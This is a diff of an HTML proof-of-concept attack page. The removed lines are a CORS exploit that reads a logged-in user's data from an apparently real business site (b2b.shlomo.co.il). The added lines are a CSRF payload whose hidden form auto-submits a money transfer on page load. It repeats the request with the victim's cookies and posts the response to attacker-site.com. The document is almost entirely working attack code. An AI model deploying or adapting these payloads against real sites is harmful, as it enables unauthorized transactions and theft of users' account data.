@@ -1,20 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit PoC</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Example</title>
 </head>
 <body>
+    <h1>CSRF Attack Payload</h1>
+    
+    <!-- This form automatically submits the CSRF request when the page is loaded -->
+    <form id="csrfForm" action="https://vulnerable-app.com/transfer" method="POST" style="display:none;">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="to_account" value="victim_account">
+        <input type="submit" value="Submit">
+    </form>
+    
     <script>
-        fetch('https://b2b.shlomo.co.il/common_api/user/getCurrent', {
-            method: 'GET',
-            credentials: 'include'
+        // Automatically submit the form to trigger the CSRF attack
+        document.getElementById('csrfForm').submit();
+
+        // Fetch API to send a POST request and store the response
+        fetch('https://vulnerable-app.com/transfer', {
+            method: 'POST',
+            credentials: 'include', // Ensures cookies are sent with the request
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'amount=1000&to_account=victim_account'
         })
-        .then(response => response.json())
+        .then(response => response.text()) // Extract the response text
         .then(data => {
-            console.log('Retrieved data:', data);
-            alert('Sensitive data: ' + JSON.stringify(data));
-        })
-        .catch(error => console.error('Error:', error));
+            console.log(data); // Log the response content to the console
+
+            // Optionally, send the response data to a remote server you control
+            fetch('https://attacker-site.com/store', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ csrf_response: data })
+            });
+        });
     </script>
 </body>
 </html>
